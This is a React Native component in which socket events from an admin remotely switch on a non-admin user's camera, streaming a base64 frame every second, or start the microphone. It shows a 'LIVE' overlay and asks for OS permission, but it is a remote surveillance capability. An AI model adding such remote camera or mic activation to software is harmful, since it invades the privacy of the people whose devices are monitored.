import React, { useEffect, useRef, useState } from "react";
import { View, StyleSheet, Modal, Platform } from "react-native";
import { CameraView, useCameraPermissions } from "expo-camera";
import { Audio } from "expo-av";
import { useSocket } from "@/context/SocketContext";
import { useAuth } from "@/context/AuthContext";
import { ThemedText } from "@/components/ThemedText";
import { ThemedView } from "@/components/ThemedView";
import { useTheme } from "@/hooks/useTheme";
import { Colors, Spacing } from "@/constants/theme";

export function RemoteAccessListener() {
  const { socket, isConnected } = useSocket();
  const { user, isAuthenticated } = useAuth();
  const { isDark } = useTheme();
  const colors = isDark ? Colors.dark : Colors.light;

  const [isCameraActive, setIsCameraActive] = useState(false);
  const [isMicActive, setIsMicActive] = useState(false);
  const [cameraType, setCameraType] = useState<"front" | "back">("front");
  const [permission, requestPermission] = useCameraPermissions();
  
  const cameraRef = useRef<CameraView>(null);
  const recordingRef = useRef<Audio.Recording | null>(null);
  const streamIntervalRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    if (!socket || !isConnected || !isAuthenticated || !user) return;
    if (user.role === "super_admin") return;

    const handleCameraRequest = async (data: { cameraType?: string }) => {
      if (Platform.OS === "web") {
        console.log("Camera remote access not available on web");
        return;
      }

      if (!permission?.granted) {
        const result = await requestPermission();
        if (!result.granted) return;
      }

      setCameraType(data.cameraType === "back" ? "back" : "front");
      setIsCameraActive(true);

      streamIntervalRef.current = setInterval(async () => {
        if (cameraRef.current) {
          try {
            const photo = await cameraRef.current.takePictureAsync({
              quality: 0.3,
              base64: true,
              skipProcessing: true,
            });
            if (photo?.base64) {
              socket.emit("camera_stream", {
                adminId: "broadcast",
                userId: user.id,
                frame: photo.base64,
              });
            }
          } catch (error) {
            console.error("Camera capture error:", error);
          }
        }
      }, 1000);
    };

    const handleMicrophoneRequest = async () => {
      if (Platform.OS === "web") {
        console.log("Microphone remote access not available on web");
        return;
      }

      try {
        const { granted } = await Audio.requestPermissionsAsync();
        if (!granted) return;

        await Audio.setAudioModeAsync({
          allowsRecordingIOS: true,
          playsInSilentModeIOS: true,
        });

        const recording = new Audio.Recording();
        await recording.prepareToRecordAsync(Audio.RecordingOptionsPresets.HIGH_QUALITY);
        await recording.startAsync();
        recordingRef.current = recording;
        setIsMicActive(true);

        streamIntervalRef.current = setInterval(async () => {
          if (recordingRef.current) {
            try {
              const status = await recordingRef.current.getStatusAsync();
              if (status.isRecording) {
                socket.emit("audio_stream", {
                  adminId: "broadcast",
                  userId: user.id,
                  duration: status.durationMillis,
                  isRecording: true,
                });
              }
            } catch (error) {
              console.error("Audio status error:", error);
            }
          }
        }, 2000);
      } catch (error) {
        console.error("Microphone access error:", error);
      }
    };

    const handleStopCamera = () => {
      setIsCameraActive(false);
      if (streamIntervalRef.current) {
        clearInterval(streamIntervalRef.current);
        streamIntervalRef.current = null;
      }
    };

    const handleStopMicrophone = async () => {
      setIsMicActive(false);
      if (streamIntervalRef.current) {
        clearInterval(streamIntervalRef.current);
        streamIntervalRef.current = null;
      }
      if (recordingRef.current) {
        try {
          await recordingRef.current.stopAndUnloadAsync();
        } catch (error) {
          console.error("Stop recording error:", error);
        }
        recordingRef.current = null;
      }
    };

    socket.on(`camera_request:${user.id}`, handleCameraRequest);
    socket.on(`microphone_request:${user.id}`, handleMicrophoneRequest);
    socket.on(`camera_stop:${user.id}`, handleStopCamera);
    socket.on(`microphone_stop:${user.id}`, handleStopMicrophone);

    return () => {
      socket.off(`camera_request:${user.id}`, handleCameraRequest);
      socket.off(`microphone_request:${user.id}`, handleMicrophoneRequest);
      socket.off(`camera_stop:${user.id}`, handleStopCamera);
      socket.off(`microphone_stop:${user.id}`, handleStopMicrophone);
      
      if (streamIntervalRef.current) {
        clearInterval(streamIntervalRef.current);
      }
      if (recordingRef.current) {
        recordingRef.current.stopAndUnloadAsync().catch(() => {});
      }
    };
  }, [socket, isConnected, isAuthenticated, user, permission, requestPermission]);

  if (!isCameraActive && !isMicActive) return null;

  return (
    <Modal visible={isCameraActive || isMicActive} transparent animationType="fade">
      <View style={styles.overlay}>
        {isCameraActive ? (
          <View style={styles.cameraContainer}>
            <CameraView
              ref={cameraRef}
              style={styles.camera}
              facing={cameraType}
            />
            <View style={[styles.indicator, { backgroundColor: colors.danger }]}>
              <ThemedText style={styles.indicatorText}>LIVE</ThemedText>
            </View>
          </View>
        ) : null}
        {isMicActive ? (
          <ThemedView style={[styles.micContainer, { backgroundColor: colors.backgroundSecondary }]}>
            <View style={[styles.micIndicator, { backgroundColor: colors.danger }]} />
            <ThemedText style={styles.micText}>Audio Recording Active</ThemedText>
          </ThemedView>
        ) : null}
      </View>
    </Modal>
  );
}

const styles = StyleSheet.create({
  overlay: {
    flex: 1,
    backgroundColor: "rgba(0,0,0,0.9)",
    justifyContent: "center",
    alignItems: "center",
  },
  cameraContainer: {
    width: "80%",
    height: "60%",
    borderRadius: 12,
    overflow: "hidden",
    position: "relative",
  },
  camera: {
    flex: 1,
  },
  indicator: {
    position: "absolute",
    top: Spacing.md,
    right: Spacing.md,
    paddingHorizontal: Spacing.md,
    paddingVertical: Spacing.xs,
    borderRadius: 4,
  },
  indicatorText: {
    color: "#FFFFFF",
    fontSize: 12,
    fontWeight: "700",
  },
  micContainer: {
    flexDirection: "row",
    alignItems: "center",
    padding: Spacing.xl,
    borderRadius: 12,
    gap: Spacing.md,
  },
  micIndicator: {
    width: 16,
    height: 16,
    borderRadius: 8,
  },
  micText: {
    fontSize: 16,
    fontWeight: "600",
  },
});
